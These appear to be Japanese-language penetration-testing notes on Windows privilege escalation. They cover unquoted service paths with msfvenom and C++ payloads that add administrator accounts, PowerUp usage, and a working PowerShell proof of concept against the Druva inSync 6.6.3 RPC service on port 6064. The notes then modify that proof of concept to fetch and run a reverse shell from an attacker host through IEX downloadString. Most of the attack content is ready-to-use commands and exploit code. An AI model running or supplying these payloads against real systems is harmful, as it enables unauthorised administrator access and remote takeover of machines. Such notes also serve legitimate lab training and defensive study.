# 脆弱なサービスを悪用したPrivilege Escalation

# 引用符で囲まれていないサービスの列挙

```
Get-CimInstance -ClassName win32_service | Select Name,State,PathName
```

```
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\\Windows\\" | findstr /i /v """                                "
```

## ペイロードの作成

### msfvenom

```
msfvenom -p windows/exec CMD='net localgroup Administrators victim-user /add' -f exe-service -o Devservice.exe
```

### C++でペイロードを作成

```c++
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
```

コンパイル

```
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

### ペイロードのターゲットパスに配置

```
copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'
```

```
mv .\Devservice.exe '\Program Files\Development Files\'
```

### ペイロードの権限を変更

```
icacls 'C:\Program Files\Development Files\Devservice.exe' /grant Everyone:F
```

### サービスの停止と起動

```
Start-Service <サービス名>
Stop-Service <サービス名>
```

## PowerUp.ps1で自動列挙

```
powershell -ep bypass
. .\PowerUp.ps1
```

### 引用符で囲まれていないパスを列挙

```
Get-UnquotedService
```

### ペイロードの書き換え

```
Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"
```

### サービスの再起動

```
Restart-Service GammaService
```

# インストールされているプログラムの列挙

```
wmic product get name
```

# スケジュールされたタスク

## タスクの列挙

```
schtasks /query /fo LIST /v
```

# Druva inSync Windows クライアントのローカル権限昇格

## 概要

`Druva inSync 6.6.3` は、公開された RPC サービスを介したコマンド インジェクション攻撃に対して脆弱である。このエクスプロイト [PoC](https://www.exploit-db.com/exploits/49211) を使用して権限を昇格できる可能性がある。`Druva inSync` は「統合されたバックアップ、電子情報開示、およびコンプライアンス監視」に使用されるアプリケーションであり、クライアント アプリケーションは強力な NT AUTHORITY のコンテキストでサービスを実行していることがわかります。 SYSTEMアカウント。エスカレーションは、ポート `6064` でローカルに実行されているサービスと対話することで可能になる。

## ローカルポートの列挙

```
netstat -ano | findstr 6064
```

## Druva inSync PowerShell 実証実験

### Exploit PoC

```powershell
$ErrorActionPreference = "Stop"

$cmd = "net user pwnd /add"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```

### PowerShell PoCの変更

`$cmd` 変数を目的のコマンドに変更する。ここでは、ローカル管理者ユーザーを追加したり、自分自身にリバース シェルを送信したりするなど、さまざまな操作を行うことができる。 [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) で試す。スクリプトを攻撃マシンにダウンロードし、`shell.ps1` に変更して以下の文を追加する。

```
Invoke-PowerShellTcp -Reverse -IPAddress <attack-ip> -Port 9001
```

Druva inSync Exploit PoC の `$cmd` 変数を変更して、PowerShell リバース シェルをメモリにダウンロードする

```
$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://<attack-ip>:8000/sell.ps1')"
```

攻撃マシンでhttpサーバーとNetcatリスナーを起動し、ターゲットホストでPoCを実行することでリバースシェルを取得できる





